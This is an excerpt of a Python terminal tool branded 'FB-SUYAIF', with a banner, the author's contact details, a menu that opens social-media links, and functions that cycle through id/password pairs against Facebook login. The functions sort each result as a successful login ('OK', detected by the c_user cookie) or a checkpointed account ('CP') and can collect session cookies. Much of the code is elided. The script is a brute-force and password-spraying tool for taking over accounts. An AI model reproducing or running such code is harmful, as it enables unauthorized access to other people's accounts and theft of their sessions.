...
$$\   $$ |$$ |  $$ |    $$ |    $$ |  $$ |  $$ |  $$ |      
\$$$$$$  |\$$$$$$  |    $$ |    $$ |  $$ |$$$$$$\ $$ |      
 \______/  \______/     \__|    \__|  \__|\______|\__|                    \033[91;1m
╔════════════════════════════════════════╗
║ [💸] CODED BY : SK SUYAIF       
║ [💸] GITHUB   : SUYAIF-404            
║ [💸] WHATSAPP : +8801320546046      
║ [💸] VERSION  : 0.0.2               
║ HACKED   : \033[1;32mSK. SK_SUYAIF\033[1;37m              
╚════════════════════════════════════════╝ {P}""")
    print(f"""{GREEN}    SELL DONE{P}
 {K}[{H}√{K}]{P} This message is for my haters 
 {K}[{H}√{K}]{P}       {H} The SUYAIF Is BACK 
 {K}[{H}√{K}]{P} Successfully Update Done {H}0.0.2""");print(led)
...
def mainx():
    ...
    print(f'{K} [{H}8{K}] {N}Contract FB-SUYAIF')
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://github.com/SUYAIF-404");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://www.facebook.com/FB.SUYAIF.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-SUYAIF {P}Terminal ');os.system("xdg-open https://www.facebook.com/profile.php?id=100067813567675");time.sleep(3);os.system('xdg-open https://www.facebook.com/profile.php?id=100067813567675');exit()
    else:
...
def mainx2():
    ...
    if mahin in ["1","01"]:
     ...
     mainx()
        ...
        print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/FB.SUYAIF.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
...
def x7():
  ...
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-SUYAIF.py')
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mSUYAIF","\x1b[1;92mSUYAIF","\x1b[1;93mSUYAIF","\x1b[1;94mSUYAIF","\x1b[1;95mSUYAIF","\x1b[1;96mSUYAIF","\x1b[1;97mSUYAIF","\x1b[1;91mSUYAIF","\x1b[1;92mSUYAIF","\x1b[1;93mSUYAIF","\x1b[1;94mSUYAIF","\x1b[1;95mSUYAIF","\x1b[1;96mSUYAIF"])
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mSUYAIF-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             ...
             break
                ...
                ok+=1
                print(f'\r{P} [{H}SUYAIF-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [SUYAIF-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mSUYAIF-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
